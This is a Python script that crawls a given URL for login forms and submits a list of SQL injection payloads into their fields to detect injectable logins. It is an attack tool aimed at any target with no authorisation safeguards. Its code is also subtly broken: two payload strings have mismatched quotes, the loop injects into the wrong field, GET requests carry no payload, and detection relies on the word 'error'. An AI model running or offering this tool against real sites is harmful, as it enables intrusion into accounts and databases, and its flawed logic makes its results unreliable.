import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import sys
import time

# List of common SQL injection payloads to test
sql_payloads = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    '" OR "a"="a',
    "' UNION SELECT NULL, NULL, NULL --",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' OR 1=1#",
    '" OR 1=1 --",
    "' OR 1=1/*",
    '" OR "a"="a" --",
]

# Function to send HTTP requests (GET and POST)
def send_request(url, data=None):
    try:
        if data:
            response = requests.post(url, data=data)
        else:
            response = requests.get(url)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None

# Function to check if the page contains a login form
def find_login_form(url):
    response = send_request(url)
    if response and response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')

        # Find all forms in the page
        forms = soup.find_all('form')
        login_forms = []

        for form in forms:
            # Check if the form contains any input fields related to login (username and password)
            inputs = form.find_all('input')
            action = form.get('action', '')
            method = form.get('method', 'get').lower()

            # If the form contains inputs for username or password, consider it a login form
            for input_tag in inputs:
                name = input_tag.get('name', '').lower()
                if 'user' in name or 'email' in name or 'login' in name or 'pass' in name:
                    login_forms.append((form, action, method))
                    break

        return login_forms
    return []

# Function to test for SQL injection on the login form
def test_sql_injection(url, login_form, method):
    action_url = login_form[1]
    if not action_url.startswith("http"):
        action_url = urljoin(url, action_url)

    # Get the input fields
    inputs = login_form[0].find_all('input')

    # Prepare a basic data payload for testing SQL injection
    payload = {}
    for input_tag in inputs:
        name = input_tag.get('name', '')
        if 'pass' in name.lower():
            payload[name] = "' OR '1'='1"
        elif 'user' in name.lower() or 'email' in name.lower():
            payload[name] = "' OR '1'='1"
        else:
            payload[name] = 'test'

    # Testing each payload
    for p in sql_payloads:
        print(f"Testing with payload: {p}")
        payload[name] = p  # Replace the payload in the relevant field
        
        if method == 'post':
            response = send_request(action_url, data=payload)
        else:
            response = send_request(action_url)

        if response and response.status_code == 200:
            response_text = response.text
            # Look for typical SQL error messages in the response
            if 'error' in response_text.lower() or 'unclosed quotation mark' in response_text.lower():
                print(f"Potential SQL Injection vulnerability detected in the login form!")
                return True
        time.sleep(1)  # To avoid rapid requests that might block you
    
    return False

# Main function to scan a URL for login forms and SQL injection
def scan_url(url):
    print(f"Scanning {url} for login forms and SQL Injection...")
    login_forms = find_login_form(url)

    if login_forms:
        print(f"Login form detected: {len(login_forms)} form(s) found. Trying SQL injection on each...")
        for login_form in login_forms:
            method = login_form[0].get('method', 'get').lower()
            vulnerable = test_sql_injection(url, login_form, method)
            if vulnerable:
                break
    else:
        print("No login form detected on this page.")

# Main function to accept command-line arguments
def main():
    if len(sys.argv) != 3 or sys.argv[1] != '-u':
        print("Usage: python sqlscan.py -u <url>")
        sys.exit(1)

    url = sys.argv[2]
    scan_url(url)

if __name__ == "__main__":
    main()
